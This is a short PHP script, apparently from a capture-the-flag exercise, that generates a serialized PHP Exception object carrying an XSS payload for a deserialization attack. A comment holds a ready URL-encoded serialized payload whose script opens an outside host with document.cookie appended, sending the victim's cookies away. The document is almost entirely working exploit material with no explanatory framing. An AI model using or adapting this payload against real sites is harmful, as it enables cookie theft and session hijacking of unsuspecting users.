<?php

//xss.php
$a = new Exception("<script>alert('xiaodi')</script>");
echo urlencode(serialize($a));


//O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A113%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fecb5ce70-0f2d-4055-9dbc-88aa1bf8190f.node5.buuoj.cn%3A81%2F%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A60%3A%22E%3A%5CFiles%5CSourceCode%5CPHP_Projects%5Cxiaodisec_php%5C76%5Cxsspop.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
?>